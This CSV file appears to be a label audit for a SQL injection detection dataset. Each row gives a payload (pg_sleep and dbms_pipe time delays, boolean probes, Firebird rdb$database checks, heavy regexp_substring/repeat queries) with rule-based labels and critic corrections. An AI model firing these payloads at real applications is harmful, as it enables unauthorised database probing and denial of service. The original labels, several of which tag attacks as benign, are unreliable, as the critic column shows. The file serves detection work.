row_index,payload_norm,sqli_type,db_engine,confidence,reasoning,label_source,verdict,critic_evidence,correction_json
1782,1' ) ) as qgyz where 1547 = 1547 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (2 open, 4 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
1791,1' in boolean mode ) order by 1--,benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 1 close). Plus attack signal detected -> benign label wrong",
1793,"1%' ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (5 open, 6 close). Plus attack signal detected -> benign label wrong",
1804,"1 ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) )",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: parentheses mismatch (16 open, 17 close). Plus attack signal detected -> benign label wrong",
1806,"1%"" ) ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (2 open, 5 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
1813,"1' ) ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (8 open, 11 close). Plus attack signal detected -> benign label wrong",
1825,"1"" or 6793 = ( select 6793 from pg_sleep ( 5 ) )",time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced double quotes (1). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
1835,select pg_sleep ( 5 ) and ( ( ( '%' = ',time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (3); parentheses mismatch (4 open, 1 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
1846,"1"" ) order by 1--",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (0 open, 1 close). Plus attack signal detected -> benign label wrong",
1883,1' ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( 'cqwz' like 'cqwz,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
1923,"1"" ) as saqy where 9704 = 9704 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (16 open, 17 close). Plus attack signal detected -> benign label wrong",
1937,"1"" ) ) ) and 7153 = 7474--",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (0 open, 3 close). Plus attack signal detected -> benign label wrong",
1939,"select pg_sleep ( 5 ) and ( ""pjql"" like ""pjql",time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced double quotes (3); parentheses mismatch (2 open, 1 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
1952,1' and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and 'lqsa' like 'lqsa,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
1971,1 ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ),benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: parentheses mismatch (2 open, 3 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'rdb$' is firebird-exclusive, but db_engine=generic","{""db_engine"": ""firebird""}"
1987,1' and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and 'pnpx' = 'pnpx,benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C8] Historical DB mismatch: 'rdb$' is firebird-exclusive, but db_engine=generic","{""db_engine"": ""firebird""}"
1990,select pg_sleep ( 5 ) and ( 'aydg' = 'aydg,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (3); parentheses mismatch (2 open, 1 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
1993,1' ) ) as xqvq where 4816 = 4816 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (2 open, 4 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
2015,"1%"" ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (5 open, 7 close). Plus attack signal detected -> benign label wrong",
2033,select pg_sleep ( 5 ) and ( 'vnss' like 'vnss,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (3); parentheses mismatch (2 open, 1 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
2104,"1"" ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (8 open, 10 close). Plus attack signal detected -> benign label wrong",
2105,select pg_sleep ( 5 ) # pjvi,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
2113,"1 ) where 5012 = 5012 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: parentheses mismatch (16 open, 17 close). Plus attack signal detected -> benign label wrong",
2115,"1"" ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (5 open, 7 close). Plus attack signal detected -> benign label wrong",
2133,"1' ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (8 open, 10 close). Plus attack signal detected -> benign label wrong",
2146,"-4669"" or 8571 = 8571--",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,[C7] Structural issue: unbalanced double quotes (1). Plus attack signal detected -> benign label wrong,
2162,"1%"" and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ""%"" = """,benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C8] Historical DB mismatch: 'rdb$' is firebird-exclusive, but db_engine=generic","{""db_engine"": ""firebird""}"
2187,1' ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( 'ayol' = 'ayol,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
2212,"1"" ) ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ( ""ipqw"" like ""ipqw",time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
2245,"-5672%"" or 3825 = 9675--",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,[C7] Structural issue: unbalanced double quotes (1). Plus attack signal detected -> benign label wrong,
2246,1' where 2547 = 2547 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
2282,"1%"" and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,[C7] Structural issue: unbalanced double quotes (1). Plus attack signal detected -> benign label wrong,
2350,1' in boolean mode ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) #,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (2 open, 3 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
2355,-2912' ) ) order by 1--,benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 2 close). Plus attack signal detected -> benign label wrong",
2365,"1"" where 9014 = 9014 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --",time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced double quotes (1). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
2424,"1"" or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ""kojr"" = ""kojr",time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
2432,1' order by 1--,benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,[C7] Structural issue: unbalanced single quotes (1). Plus attack signal detected -> benign label wrong,
2434,1' ) ) ) and 5615 = 5458--,benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 3 close). Plus attack signal detected -> benign label wrong",
2439,"-3546%"" or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ""%"" = """,benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C8] Historical DB mismatch: 'rdb$' is firebird-exclusive, but db_engine=generic","{""db_engine"": ""firebird""}"
2465,-1802' or 7931 = 5841--,benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,[C7] Structural issue: unbalanced single quotes (1). Plus attack signal detected -> benign label wrong,
2491,-6122' ) ) ) or 9243 = 6161--,benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 3 close). Plus attack signal detected -> benign label wrong",
2504,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) ||'",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (7 open, 8 close). Plus attack signal detected -> benign label wrong",
2521,"1"" ) as zovk where 4591 = 4591 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (2 open, 3 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
